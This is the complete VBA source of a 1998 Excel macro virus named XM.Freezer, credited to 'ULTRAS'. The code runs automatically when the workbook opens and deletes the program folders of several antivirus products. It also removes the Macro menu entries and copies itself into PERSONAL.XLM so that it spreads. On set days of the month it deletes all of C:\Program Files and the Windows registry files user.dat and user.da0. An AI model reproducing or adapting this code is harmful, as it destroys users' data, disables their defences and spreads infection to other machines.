   Attribute VB_Name = "Sheet3"

   '********************************
   '* Name    : XM.Freezer         *
   '* Created : February 5, 1998   *
   '* Author  : ULTRAS             *
   '********************************
   Sub Auto_Open()
   Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
   On Error Resume Next
   Call Auto_Close
   Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
   MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\Program Files\FindVirus\*.*"
   MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\f-macro\*.*"
   MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\Program Files\Command Software\F-PROT95\*.*"
   MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\Program Files\McAfee\VirusScan\*.*"
   MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
   Kill "C:\Program Files\Norton AntiVirus\*.*"
   Call Joke
   End Sub

   Sub Auto_Close()
   Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
   On Error Resume Next
   ULTRAS = 0
   Freezer = 0
   Application.ScreenUpdating = False
   For b = 1 To Application.Workbooks.Count
   If Application.Workbooks(b).Name = "PERSONAL.XLM" Then
   ULTRAS = 1
   For u = 1 To Application.Workbooks("PERSONAL.XLM").Modules.Count
   If Application.Workbooks("PERSONAL.XLM").Modules(u).Name = "Sheet3" Then
   Freezer = 1
   End If
   Next
   If Freezer = 0 Then
   Windows("PERSONAL.XLM").Visible = True
   Application.Workbooks("Freezer.XLM").Modules("Sheet3").Copy after:=Application.Workbooks("PERSONAL.XLM").Modules(1)
   Windows("PERSONAL.XLM").Visible = False
   Application.Workbooks("PERSONAL.XLM").Save
   End If
   End If
   Next
   If ULTRAS = 0 Then
   newname$ = ActiveWorkbook.Name
   Application.Workbooks(newname$).SaveCopyAs Application.StartupPath + "\PERSONAL.XLM"
   Application.Workbooks.Open (Application.StartupPath + "\PERSONAL.XLM")
   Windows("PERSONAL.XLM").Visible = False
   Application.Workbooks("PERSONAL.XLM").Save
   End If
   Application.ScreenUpdating = True
   End Sub

   Sub Joke()
   Attribute Joke.VB_ProcData.VB_Invoke_Func = " \n14"
   On Error GoTo HaHaHa
   If Day(Now()) = 14 Then
   MsgBox "You Infected XM.Freezer by ULTRAS", 16, "ULTRAS"
   Shell ("Deltree  /y C:\Progra~1")
   End If
   If Day(Now()) = 28 Then
   MsgBox "You Infected XM.Freezer by ULTRAS", 48, "ULTRAS"
   SetAttr "c:\windows\user.dat", 0
   SetAttr "c:\windows\user.da0", 0
   Kill "c:\windows\user.dat"
   Kill "c:\windows\user.da0"
   End If
   HaHaHa:
   End Sub
